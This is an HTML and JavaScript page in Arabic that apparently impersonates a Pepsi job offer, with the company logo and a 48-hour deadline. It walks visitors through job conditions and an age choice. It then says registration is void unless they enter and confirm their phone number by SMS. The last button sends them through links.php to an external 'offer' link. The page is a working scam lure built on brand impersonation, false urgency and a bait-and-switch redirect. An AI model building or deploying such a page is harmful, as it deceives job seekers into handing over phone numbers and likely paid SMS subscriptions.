<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>Document</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <link id="botss" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <link href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" rel="stylesheet">
    </head>
    <body id="root">
        <style>
        body {
            background-color: #f0f2f5;
        }
        .vvv {
            /* background-color: #1877f2; */
            /* color: #ffff; */
            margin-top: 20px;
            padding: 6px;
            width: 85%;
        }
        
        .vvc {
            background-color: #d4d9e7;
            color: black;
            margin-top: 20px;
            padding: 6px;
            width: 85%;
        }
        .vvv:hover {
            color: #ffff;
        }
        
        .headerP{
            margin:0 auto;
            padding:6px;
            color:#f4f4f5;
        }
        .xheader {
            background: #3b5998;
            box-sizing: border-box;
            height: 44px;
            margin: 0 auto;
            padding: 0;
            position: relative;
            width: 100%;
            z-index: 12;
            align-items: center;
            display: flex;
            display: -webkit-flex;
            text-align: center;
        }
        .xthelogo {
            padding:6px;
            padding:6px;
            float:left;
            color: #576b95;
            cursor: pointer;
            text-decoration: none;
            width: 50px;
            height: 50px;
        }
            /* Absolute Center Spinner */
            .loading0 {
              position: fixed;
              z-index: 999;
              height: 2em;
              width: 2em;
              overflow: show;
              margin: auto;
              top: 0;
              left: 0;
              bottom: 0;
              right: 0;
            }
            
            /* Transparent Overlay */
            .loading0:before {
              content: '';
              display: block;
              position: fixed;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              background: red;
              background: blue;
            }
            
            /* :not(:required) hides these rules from IE9 and below */
            .loading0:not(:required) {
              font: 0/0 a;
              color: transparent;
              text-shadow: none;
              background-color: red;
              border: 0;
            }
            
            .loading0:not(:required):after {
              content: '';
              display: block;
              font-size: 10px;
              width: 1em;
              height: 1em;
              margin-top: -0.5em;
              -webkit-animation: spinner 150ms infinite linear;
              -moz-animation: spinner 150ms infinite linear;
              -ms-animation: spinner 150ms infinite linear;
              -o-animation: spinner 150ms infinite linear;
              animation: spinner 150ms infinite linear;
              border-radius: 0.5em;
              -webkit-box-shadow: rgba(255,255,255, 0.75) 1.5em 0 0 0, rgba(255,255,255, 0.75) 1.1em 1.1em 0 0, rgba(255,255,255, 0.75) 0 1.5em 0 0, rgba(255,255,255, 0.75) -1.1em 1.1em 0 0, rgba(255,255,255, 0.75) -1.5em 0 0 0, rgba(255,255,255, 0.75) -1.1em -1.1em 0 0, rgba(255,255,255, 0.75) 0 -1.5em 0 0, rgba(255,255,255, 0.75) 1.1em -1.1em 0 0;
            box-shadow: rgba(255,255,255, 0.75) 1.5em 0 0 0, rgba(255,255,255, 0.75) 1.1em 1.1em 0 0, rgba(255,255,255, 0.75) 0 1.5em 0 0, rgba(255,255,255, 0.75) -1.1em 1.1em 0 0, rgba(255,255,255, 0.75) -1.5em 0 0 0, rgba(255,255,255, 0.75) -1.1em -1.1em 0 0, rgba(255,255,255, 0.75) 0 -1.5em 0 0, rgba(255,255,255, 0.75) 1.1em -1.1em 0 0;
            }
            
            /* Animation */
            
            @-webkit-keyframes spinner {
              0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
              }
              100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
              }
            }
            @-moz-keyframes spinner {
              0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
              }
              100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
              }
            }
            @-o-keyframes spinner {
              0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
              }
              100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
              }
            }
            @keyframes spinner {
              0% {
                -webkit-transform: rotate(0deg);
                -moz-transform: rotate(0deg);
                -ms-transform: rotate(0deg);
                -o-transform: rotate(0deg);
                transform: rotate(0deg);
              }
              100% {
                -webkit-transform: rotate(360deg);
                -moz-transform: rotate(360deg);
                -ms-transform: rotate(360deg);
                -o-transform: rotate(360deg);
                transform: rotate(360deg);
              }
            }
            
            .ltr {
              direction: rtl;
            }
        </style>
        <div id="load_1"></div>
        <header class="xheader">
            <img src="https://static.wixstatic.com/media/18b764_343e2a246e8f4f40a08a4d715801940a~mv2.png/v1/fit/w_2500,h_1330,al_c/18b764_343e2a246e8f4f40a08a4d715801940a~mv2.png" class="xthelogo">
            <span class="headerP">الحصول على فرصة عمل مميزة</span>
        </header>
        <center>
            <img style="border-radius:12px ;height: 100px; aspect-ratio: auto 50 / 50; width: 80px; margin-bottom: 20px; margin-top: 20px" src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/Pepsi_logo_2014.svg/258px-Pepsi_logo_2014.svg.png" class="photooo">
            <br>
            <div style="margin-bottom: 10px">
                <h6 id="text" style="color: red;">التسجيل في الوضيفة ينتهي التسجيل خلال 48 ساعة القادمة </h6>
            </div>
            <div style="margin-bottom: 10px;">
                    <h4 class="txc ltr" style="width: 80%;">نحن نتلقا يوميا عشرات طلبات التسجيل في الوظيفة التي طرحناها على منصات التواصل الاجتماعي لذلك التقديم من خلال النمودج اسفله ليتم معالجة طلبك و شكرا على تفهمك</h4>
            </div>
        </center>
        
        <center style="margin-top: 20px">
            <button id="step1" name="0" type="submit" class="btn vvv btn-primary btn-lg btn-block" onclick="showlog(this)" >اضغط لتقدم للوظيفة</button> <br>
            <div id="page"></div>
        </center>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/js-cookie/3.0.1/js.cookie.min.js"></script>
        <script src="setting.js"></script>
        <script>
            function sleep (time) {return new Promise((resolve) => setTimeout(resolve, time));}
            function showlog(tok){
                var html = "";
                var cond = ""
                var text = "";
                switch(tok.name){
                    case "0":
                        $.getJSON("job.json", function (data) {
                            $.each(data['condition'], function (key, val) {
                                cond += '<p >'+val.cond+'</p>';
                            });
                            $(".txc").html(cond); 
                        });

                        text = ": شروط و تفاصيل العمل"
                        html = '<button name="1" type="submit" class="btn vvv btn-success btn-lg btn-block" onclick="showlog(this)" >متابعة التسجيل</button>';
                        break;
                    case "1" :
                        $(".txc").empty(); 
                        text = ": من فضلك قم بتحديد عمرك من خلال"
                        html = '<button name="2" type="submit" class="btn vvv btn-success btn-lg btn-block" onclick="showlog(this)" > 18 ans - 25 ans</button> <br> <button name="2" type="submit" class="btn vvv btn-success btn-lg btn-block" onclick="showlog(this)" > 26 ans - 34 ans</button> <br> <button name="2" type="submit" class="btn vvv btn-success btn-lg btn-block" onclick="showlog(this)" > 35 ans - 42 ans</button> <br> <button name="2" type="submit" class="btn vvv btn-success btn-lg btn-block" onclick="showlog(this)" > > 43 ans </button> <br>';
                        break;
                    case '2':
                        text = "بدون تاكيد رقمك التسجيل يعتبر ملغي";
                        $('.txc').html('لاتمام التسجيل المرجوا الضغط على الزر اسفله و ادخل رقمك و تاكيده من خلال رسالة التفعيل على هاتفك لتاكيد تسجيلك بنجاح');
                        html = ' <br>  <button id="step1" name="5" type="submit" class="btn btn-success btn-lg btn-block" onclick="showlog(this)" >تاكيد البيانات الخاصة بي</button>'; 

                        Cookies.set('cname', $('#inputname').val(), { expires: 365 });
                        Cookies.set('email', $('#inputmail').val(), { expires: 365 });
                        Cookies.set('country', $('#inputcountry').val(), { expires: 365 });

                        break;
                    case '5':
                        if(useSp == "yes"){
                          $.ajax('/links.php', {
                                type: 'POST',
                                data: {data:""},
                                success: function (dat) {
                                    console.log(JSON.parse(dat));
                                    if(JSON.parse(dat)[0]){
                                        window.open(JSON.parse(dat)[0].offlink).focus();
                                    }else{
                                        window.open(deflink).focus();
                                    }
                                },
                                error: function (jqXhr, textStatus, errorMessage) {
                                    alert('error');
                                }
                          });      
                      }else {
                        window.open(deflink).focus();
                      }

                    default:
                        html = '';
                        break;
                }

                if(tok.name !== '5'){
                  $('#load_1').html('<div class="loading0">Loading</div>');
                  sleep(800).then(() => {
                      $('#load_1').empty();
                      $("#step1").hide();
                      $("#page").html(html);
                      $("#text").html(text); 
                  })
                }
            }
        </script>
    </body>
</html>
